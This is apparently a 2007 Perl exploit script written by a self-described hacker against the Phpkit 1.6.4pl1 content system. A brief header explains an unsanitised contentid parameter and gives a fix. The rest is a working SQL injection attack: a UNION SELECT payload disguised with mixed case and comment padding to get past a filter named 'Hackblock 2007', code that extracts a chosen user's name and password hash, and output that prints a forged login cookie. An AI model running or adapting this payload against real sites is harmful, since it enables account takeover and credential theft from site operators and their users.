#!/usr/bin/perl
#  Vulnerability found & exploit written by $h4d0wl33t (shadowleet)
#  Contact: shadowleet@safe-mail.net
#   Phpkit 1.6.4pl1 Non Public Exploit by $hadowleet,
#   Description:
#   Vulnerability in file pkinc/public/article.php
#   On line 71:
#
#   $contentid=(!$contentid && isset($_REQUEST['contentid'])
#   && intval($_REQUEST['contentid'])>0) ? $_REQUEST['contentid'] : $contentid;
#
#   $contentid gets initialized normal but not going through safe function $sql->f in sql statement
#
#   Use in sql statement:
#   $contentinfo=$DB->fetch_array($DB->query
#   ("SELECT * FROM ".$db_tab['content']." where content_id='".$contentid."' LIMIT 1"))
#
#   Security fix:
#   Replace:
#   && intval($_REQUEST['contentid'])>0) ? $_REQUEST['contentid'] : $contentid;
#   with : 
#   && intval($_REQUEST['contentid'])>0) ? intval($_REQUEST['contentid']) : $contentid;
#
#   Conditions:
#   1. Magic_quotes needs to be off
#   2. There must be any articles in the database.
#   Have fun :)
#_________________________________________________
use LWP;
use HTTP::Request;
use Getopt::Long;

sub header
{
print "\n";
print "                 ###################################################\n";
print "                 #Phpkit 1.6.4pl1 Non Public Exploit by \$hadowleet #\n";
print "                 #              + Hackblock 2007 bypass            #\n";
print "                 ###################################################\n";
print "\n";
}
sub usage
{
  print "-------------------------------------------------------------------------------------\n";
  print "|   Usage:                                                                          |\n";
  print "|   exploit.pl                                                                      |\n";
  print "|  -url    [URL] (http://phpkit.de                                                  |\n";
  print "|  -uid    [userid] (1)                                                             |\n";
  print "|  -pre    [databaseprefix] (phpkit)                                                |\n";
  print "|  -p      [proxy]  (http://proxyip:port)                                           |\n";
  print "|                                                                                   |\n";               
  print "|   Example:                                                                        |\n";
  print "|   exploit.pl -url http://phpkit.de/ -cat 2 -uid 1 -pre phpkit                     |\n";
  print "|                                                                                   |\n";
  print "|   Or for standard Values:                                                         |\n";
  print "|   exploit.pl -url http://phpkit.de/                                               |\n";
  print "|                                                                                   |\n";
  print "|   You need a valid category id, you can get it when you open the link             |\n";
  print "|   http://page.de/include.php?path=contentarchive&type=1                           |\n";
  print "|   and click on one article, then read in the url the catid number and use it      |\n";
  print "|   Standard value for catid is 2                                                   |\n";
  print "-------------------------------------------------------------------------------------\n";
}                                                                                 

my %parameter = ();
GetOptions(\%parameter, "url=s", "uid=i", "pre=s", "p=s", "cat=i");
$url = $parameter{"url"};
$uid = $parameter{"uid"};
$cat = $parameter{"cat"};
$prefix = $parameter{"pre"};
$proxy =  $parameter{"p"};
if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url."/";}
if($url !~ /http:\/\//){$url = "http://".$url;}
if($proxy)
{
if($proxy !~ /http:\/\//){die ("Proxy format must be: \"http://ip:port\"\n");}
}
if(!$cat){$cat = 2;}
if(!$uid){$uid = 1;}
if(!$prefix){$prefix = "phpkit";}
$bugfile = "include.php?path=article";
$sqlinjection = "9999999999'/**/UnIoN/**/SeLeCt/**/1,".$cat.",3,CoNcAt('Login:',user_name),5,CoNcAt('Password:',user_pw),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25/**/FrOm/**/".$prefix."_user/**/WhErE/**/user_id=".$uid."/*--";
$poststring = "contentid=".$sqlinjection;
$imgcode = 0;
 
sub Exploit()
{
$requestpage = $url.$bugfile;
print "Requesting Page: ".$requestpage."\n";
my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
if($proxy){$ua->proxy( 'http', $proxy );}
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("http://www.deinemudda.de");
$req->content_type('application/x-www-form-urlencoded');
$contlen = length($poststring);
$req->header("content-length" => $contlen);
$req->content($poststring);
$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();
#Debug Modus delete # at beginning of next line
#print $content;
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<\/a>/,$name);
$name = @name[0];
@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/<\/font>/,$password);
$password = @password[0];
if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed, ~Magic quotes on~ or article id doesn't exists, just read usage!\n\n";
exit;
}
print "Data:\n";
print "-----------------------------------------------------\n";
print "Name: " .$name."\n";
print "Password: " .$password."\n\n";
print "Logincookie->:\nuser_id%3E".$uid."%2Cuser_name%3E".$name."%2Cuser_pw%3E".$password."\n\n";
print "-----------------------------------------------------\n";
print "Enjoy the day :)\n";
}
#Starting
print "\n\nExploiting...\n";
Exploit();
#End
#Copyright by $h4d0wl33t 2007
